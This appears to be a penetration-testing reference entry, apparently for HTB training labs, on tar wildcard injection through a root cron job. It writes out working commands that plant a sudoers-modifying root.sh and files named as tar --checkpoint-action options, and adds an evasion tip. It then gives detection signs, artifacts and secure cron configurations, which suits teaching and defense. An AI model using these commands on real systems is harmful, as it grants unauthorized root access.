examples.label: Drop the payload script and checkpoint-action filenames

notes: A root cron running `tar ... *` in a writable dir treats attacker-named files as tar flags. Filenames --checkpoint=1 and --checkpoint-action=exec=sh root.sh make tar execute your script as root.

recommended.note: Confirm the root cron with pspy first.
Find the writable dir the cron operates on.

name: Wildcard Abuse - tar checkpoint (root cron)
description: A root cron job running `tar ... *` in a writable dir treats attacker-named files as tar options. Plant files named as --checkpoint flags so tar executes your script as root.

steps.label: 1. Confirm the vulnerable job
steps.command:
# e.g. */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
man tar   # see --checkpoint / --checkpoint-action

steps.label: 2. Plant payload + option-named files
steps.command:
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
ls -la

defense.why_it_works: When tar is called with a wildcard (*) argument, the shell expands the wildcard to all matching filenames. Specially named files like '--checkpoint=1' and '--checkpoint-action=exec=sh root.sh' are expanded as tar command-line arguments, triggering tar's checkpoint action to execute the payload as the user running tar (root in a cron job).
defense.prerequisites: A cron job or script runs 'tar ... *' in an attacker-writable directory. Attacker can create files in that directory. Root executes the tar command with the wildcard.
defense.impact: Arbitrary command execution as root when the cron job fires. Can be used to add sudoers entries, create SUID shells, or install reverse shells.
defense.detection: Files named '--checkpoint=1' or '--checkpoint-action=exec=...' appearing in monitored directories. Cron job execution spawning unexpected child processes. File integrity monitoring alert on checkpoint-named files.
defense.artifacts: File system: files named --checkpoint* in cron-processed directory | Auditd: tar spawning unexpected child process | /etc/sudoers modified by cron
defense.prevention: Always quote wildcard arguments or use absolute glob patterns in cron scripts instead of bare *. Use --no-wildcards-match-slash in tar where applicable. Ensure cron-processed directories are not writable by untrusted users. Run tar with -- to terminate option parsing: 'tar -cf backup.tgz -- *' (partially mitigates).
defense.misconfiguration: Root cron job runs: cd /home/user && tar -zcf backup.tgz * with the target directory writable by the attacker user.
defense.vulnerable_config:
# Vulnerable cron job
*/01 * * * * root cd /home/htb-student && tar -zcf backup.tar.gz *

# Attacker creates:
# --checkpoint=1
# --checkpoint-action=exec=sh root.sh
# root.sh adds htb-student to sudoers
defense.secure_config:
# Use explicit file list instead of wildcard
*/01 * * * * root tar -zcf /backups/backup.tar.gz /var/www/html/

# If wildcard needed, restrict directory permissions
chown root:root /home/htb-student/
chmod 755 /home/htb-student/

# Or use find | tar instead
find /home/htb-student/ -maxdepth 1 -type f | tar -czf backup.tar.gz --files-from=-
defense.evasion: Create checkpoint files silently. The malicious filenames are invisible in normal directory listings unless user is aware of the technique.
